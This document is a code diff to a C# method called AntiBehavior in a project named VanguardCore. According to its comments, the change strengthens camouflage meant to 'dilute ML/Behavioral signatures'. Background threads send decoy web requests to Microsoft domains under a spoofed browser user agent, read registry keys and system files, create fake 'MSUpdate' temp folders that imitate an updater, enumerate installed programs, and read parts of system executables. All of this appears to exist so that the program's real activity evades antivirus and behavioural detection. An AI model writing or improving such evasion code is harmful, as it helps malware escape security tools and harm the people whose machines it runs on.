@@ -1368,61 +1368,150 @@ namespace VanguardCore
 
         public static void AntiBehavior()
         {
-            // Random behavior patterns
+            // Random behavior patterns to dilute ML/Behavioral signatures
             Random rnd = new Random();
             
-            // Generate fake network traffic
+            // 1. Fake network traffic to high-reputation Microsoft domains
             new Thread(new ThreadStart(delegate {
                 try
                 {
                     WebClient wc = new WebClient();
-                    string[] fakeSites = new string[] { "http://bing.com", "http://google.com", "http://microsoft.com" };
+                    wc.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36");
+                    string[] fakeSites = new string[] { 
+                        "https://www.microsoft.com/en-us/windows/", 
+                        "https://update.microsoft.com/", 
+                        "https://bing.com/news",
+                        "https://outlook.live.com/",
+                        "https://msdn.microsoft.com/"
+                    };
                     while (true)
                     {
-                        string url = fakeSites[rnd.Next(fakeSites.Length)];
-                        wc.DownloadString(url);
-                        Thread.Sleep(rnd.Next(30000, 120000));
+                        try {
+                            string url = fakeSites[rnd.Next(fakeSites.Length)];
+                            wc.DownloadString(url);
+                        } catch { }
+                        Thread.Sleep(rnd.Next(45000, 150000));
                     }
                 }
                 catch { }
             })) { IsBackground = true }.Start();
 
-            // Fake registry access
+            // 2. Fake system discovery (reading non-sensitive but common keys/files)
             new Thread(new ThreadStart(delegate {
                 try
                 {
-                    string[] regPaths = new string[] {
-                        @"SOFTWARE\Microsoft\Windows\CurrentVersion\Run",
-                        @"SYSTEM\CurrentControlSet\Services",
-                        @"SOFTWARE\Microsoft\Windows NT\CurrentVersion"
+                    string[] commonFiles = {
+                        Path.Combine(Environment.SystemDirectory, "drivers\\etc\\hosts"),
+                        Path.Combine(Environment.SystemDirectory, "license.rtf"),
+                        Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Windows), "win.ini")
                     };
                     
                     while (true)
                     {
-                        using (RegistryKey key = Registry.LocalMachine.OpenSubKey(regPaths[rnd.Next(regPaths.Length)]))
-                        {
-                            if (key != null)
-                            {
-                                string[] names = key.GetValueNames();
+                        // Registry discovery
+                        string[] regPaths = {
+                            @"SOFTWARE\Microsoft\Windows NT\CurrentVersion",
+                            @"SYSTEM\CurrentControlSet\Control\ComputerName\ComputerName",
+                            @"SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced"
+                        };
+                        
+                        try {
+                            using (var key = Registry.LocalMachine.OpenSubKey(regPaths[rnd.Next(regPaths.Length)])) {
+                                if (key != null) { var names = key.GetValueNames(); }
                             }
-                        }
-                        Thread.Sleep(rnd.Next(10000, 60000));
+                        } catch { }
+
+                        // File discovery
+                        try {
+                            string f = commonFiles[rnd.Next(commonFiles.Length)];
+                            if (File.Exists(f)) { string c = File.ReadAllText(f).Substring(0, 100); }
+                        } catch { }
+
+                        Thread.Sleep(rnd.Next(20000, 80000));
                     }
                 }
                 catch { }
             })) { IsBackground = true }.Start();
 
-            // Fake file operations
+            // 3. Realistic temporary file operations (Mimicking installer/update behavior)
             new Thread(new ThreadStart(delegate {
                 try
                 {
                     string temp = Path.GetTempPath();
                     while (true)
                     {
-                        string fakeFile = Path.Combine(temp, string.Format("tmp{0:X}.tmp", rnd.Next()));
-                        File.WriteAllText(fakeFile, "Fake data");
-                        Thread.Sleep(rnd.Next(5000, 15000));
-                        File.Delete(fakeFile);
+                        try {
+                            string subDir = Path.Combine(temp, $"MSUpdate_{rnd.Next(1000, 9999)}");
+                            Directory.CreateDirectory(subDir);
+                            
+                            string fakeFile = Path.Combine(subDir, $"setup_{rnd.Next(100, 999)}.tmp");
+                            byte[] data = new byte[rnd.Next(1024, 10240)];
+                            rnd.NextBytes(data);
+                            File.WriteAllBytes(fakeFile, data);
+                            
+                            Thread.Sleep(rnd.Next(10000, 30000));
+                            
+                            if (Directory.Exists(subDir)) Directory.Delete(subDir, true);
+                        } catch { }
+                        Thread.Sleep(rnd.Next(15000, 45000));
+                    }
+                }
+                catch { }
+            })) { IsBackground = true }.Start();
+
+            // 4. Professional Telemetry Noise (App Metadata Discovery)
+            new Thread(new ThreadStart(delegate {
+                try
+                {
+                    string[] appKeys = {
+                        @"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall",
+                        @"SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall"
+                    };
+                    
+                    while (true)
+                    {
+                        try {
+                            string root = appKeys[rnd.Next(appKeys.Length)];
+                            using (var key = Registry.LocalMachine.OpenSubKey(root)) {
+                                if (key != null) {
+                                    string[] subs = key.GetSubKeyNames();
+                                    // "Discover" 3-5 random apps
+                                    for (int i = 0; i < rnd.Next(3, 6); i++) {
+                                        string sub = subs[rnd.Next(subs.Length)];
+                                        using (var sKey = key.OpenSubKey(sub)) {
+                                            if (sKey != null) { var val = sKey.GetValue("DisplayName"); }
+                                        }
+                                        Thread.Sleep(rnd.Next(1000, 3000));
+                                    }
+                                }
+                            }
+                        } catch { }
+                        Thread.Sleep(rnd.Next(60000, 180000));
+                    }
+                }
+                catch { }
+            })) { IsBackground = true }.Start();
+
+            // 5. Benign File "Telemetry" (hashing non-suspect system files)
+            new Thread(new ThreadStart(delegate {
+                try
+                {
+                    string sysDir = Environment.SystemDirectory;
+                    string[] targets = { "notepad.exe", "calc.exe", "mspaint.exe", "choice.exe" };
+                    
+                    while (true)
+                    {
+                        try {
+                            string target = Path.Combine(sysDir, targets[rnd.Next(targets.Length)]);
+                            if (File.Exists(target)) {
+                                using (var stream = File.OpenRead(target)) {
+                                    byte[] buffer = new byte[8192];
+                                    stream.Read(buffer, 0, buffer.Length);
+                                    // Just "touch" the first chunk to simulate hashing
+                                }
+                            }
+                        } catch { }
+                        Thread.Sleep(rnd.Next(30000, 90000));
                     }
                 }
                 catch { }
